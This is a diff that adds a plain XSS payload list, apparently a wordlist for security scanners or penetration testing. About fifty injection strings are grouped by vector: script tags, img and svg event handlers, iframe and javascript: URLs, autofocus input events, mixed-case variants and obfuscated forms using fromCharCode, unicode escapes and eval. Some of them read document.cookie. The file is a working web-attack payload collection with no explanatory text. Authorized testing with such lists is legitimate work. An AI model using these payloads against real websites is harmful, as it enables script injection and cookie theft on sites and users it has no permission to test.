@@ -1,0 +1,66 @@
+# XSS Payloads
+# Basic script tags
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+
+# Image-based XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img/src=x onerror=alert('XSS')>
+
+# SVG-based XSS
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+
+# Body/HTML events
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<body onfocus=alert('XSS')>
+
+# Iframe-based XSS
+<iframe src=javascript:alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+
+# Input events
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus>
+<input onchange=alert('XSS') autofocus>
+
+# Form elements
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+
+# Video/Audio
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+
+# Advanced/Obfuscated
+'\"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('XSS')</script>
+<script>eval('ale'+'rt(1)')</script>
+
+# Event handlers
+<div onmouseover=alert('XSS')>
+<a href="#" onclick=alert('XSS')>Click</a>
+<button onclick=alert('XSS')>Click</button>
+
+# JavaScript protocol
+javascript:alert('XSS')
+javascript:alert(1)
+javascript:alert(document.cookie)
+
+# Mixed case/encoded
+<ScRiPt>alert('XSS')</sCrIpT>
+<IMG SRC=x OnErRoR=alert('XSS')>
+<svg/OnLoAd=alert('XSS')>
+
+# Other vectors
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<object data="javascript:alert('XSS')">
